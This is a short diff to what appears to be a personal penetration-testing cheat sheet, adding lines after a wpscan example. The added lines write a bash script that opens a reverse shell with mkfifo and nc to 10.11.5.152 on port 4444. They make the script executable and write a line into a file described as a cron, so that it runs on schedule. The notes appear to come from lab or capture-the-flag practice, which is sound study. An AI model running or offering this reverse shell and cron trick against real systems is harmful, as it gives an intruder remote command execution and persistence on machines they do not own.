@@ -597,3 +597,17 @@ If we get two files: asc and gpg then:
 When there is a Wordpress, we can use wpscan!
 
 wpscan --url=10.10.0.1/wordpress
+
+<br />
+<br />
+
+
+cat << EOF > /tmp/rev
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.5.152 4444 >/tmp/f
+EOF
+chmod +x /tmp/rev
+printf 'revshell time; /tmp/rev\n' > FILE
+
+
+Creates a /tmp/rev in stream and then prints content to FILE which is a cron
